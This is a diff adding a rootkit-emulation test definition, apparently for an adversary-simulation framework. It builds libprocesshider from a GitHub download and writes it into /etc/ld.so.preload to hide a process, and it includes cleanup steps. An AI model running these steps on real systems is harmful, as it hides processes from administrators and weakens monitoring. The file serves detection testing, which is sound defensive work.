@@ -1,0 +1,44 @@
+api_version: "2.0"
+name: dynamic-linker based rootkit (libprocesshider)
+description: |
+    Uses libprocesshider to simulate rootkit behavior by hiding a specific process name via ld.so.preload (see also T1574.006).
+args:
+    - name: repo
+      type: string
+      default: https://github.com/gianlucaborello/libprocesshider/
+    - name: rev
+      type: string
+      default: 25e0587d6bf2137f8792dc83242b6b0e5a72b415
+    - name: library_path
+      type: string
+      default: /usr/local/lib/libprocesshider.so
+uuid: 1338bf0c-fd0c-48c0-9e65-329f18e2c0d3
+mitre:
+    tactics:
+        - 'TA0005: Defense Evasion'
+    techniques:
+        - 'T1014: Rootkit'
+requirements:
+    platforms:
+        - os: linux
+steps:
+    - name: |
+        The preload library must exist on disk at specified location (#{library_path})
+      inline: |
+        if [ -f #{library_path} ]; then exit 0; else {mkdir -p /tmp/atomic && cd /tmp/atomic
+        curl -sLO #{repo}/archive/#{rev}.zip && unzip #{rev}.zip && cd libprocesshider-#{rev}
+        make
+        cp libprocesshider.so #{library_path}
+        cp /usr/bin/ping /usr/local/bin/evil_script.py
+        }; fi;
+      executor: bash
+    - name: dynamic-linker-based-rootkit-(libprocesshider)
+      inline: |
+        echo {{.Args.library_path}} | tee -a /etc/ld.so.preload
+        /usr/local/bin/evil_script.py localhost -c 10 >/dev/null & pgrep -l evil_script.py || echo "process hidden"
+      executor: sh
+      cleanup:
+        inline: |
+            sed -i "\:^{{.Args.library_path}}:d" /etc/ld.so.preload
+            rm -rf {{.Args.library_path}} /usr/local/bin/evil_script.py /tmp/atomic
+        executor: sh
